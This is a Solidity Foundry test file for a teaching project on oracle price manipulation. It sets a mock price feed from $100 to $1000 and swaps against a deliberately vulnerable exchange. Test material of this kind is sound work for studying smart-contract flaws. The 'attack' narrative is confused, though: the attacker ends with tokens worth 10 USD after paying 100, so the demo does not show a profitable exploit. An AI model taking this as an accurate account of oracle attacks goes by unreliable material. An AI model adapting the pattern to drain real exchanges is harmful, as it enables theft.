// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/oracle-price-manipulation/VulnerableExchange.sol";
import "../src/oracle-price-manipulation/MockV3Aggregator.sol";

/// @title Oracle Price Test Contract
/// @author Ishan Lakhwani
/// @notice Test contract for testing oracle price manipulation vulnerabilities
/// @dev Tests price manipulation scenarios in VulnerableExchange contract
contract OraclePriceTest is Test {
    VulnerableExchange public exchange;
    MockV3Aggregator public priceFeed;

    function setUp() public {
        priceFeed = new MockV3Aggregator(8, 100 * 10 ** 8); // Initial price: $100 (8 decimals)
        exchange = new VulnerableExchange(address(priceFeed), 1000, 10); // Initial reserves: 1000 USD, 10 TOKEN
    }

    function testPriceManipulation() public {
        console.log("\n=== Oracle Price Manipulation Attack ===");
        console.log("Initial TOKEN price: %s USD", priceFeed.latestAnswer() / 1e8);

        console.log("\n[Step 1] Attacker manipulates price:");
        priceFeed.updateAnswer(1000 * 10 ** 8);
        console.log("Manipulated TOKEN price to: %s USD", priceFeed.latestAnswer() / 1e8);

        console.log("\n[Step 2] Exploit with 100 USD:");
        uint256 tokensReceived = exchange.swapUSDForToken(100 * 10 ** 18);
        console.log("Attacker receives: %s TOKEN", tokensReceived / 1e18);

        assertEq(tokensReceived, (100 * 10 ** 18) / 1000);

        priceFeed.updateAnswer(100 * 10 ** 8);
        uint256 finalUSDValue = exchange.getTokenValueInUSD(tokensReceived);

        console.log("\n[Step 3] Attack Result:");
        console.log("Tokens now worth: %s USD", finalUSDValue / 1e18);

        assertEq(finalUSDValue, 10 * 10 ** 18);
    }

    function testSwap() public {
        console.log("\n=== Normal Swap Test ===");
        uint256 tokensReceived = exchange.swapUSDForToken(100 * 10 ** 18);
        console.log("Tokens received: %s TOKEN", tokensReceived / 1e18);
        assertEq(tokensReceived, 1 * 10 ** 18);

        uint256 usdReceived = exchange.swapTokenForUSD(1 * 10 ** 18);
        console.log("USD received: %s USD", usdReceived / 1e18);
        assertEq(usdReceived, 100 * 10 ** 18);
    }
}
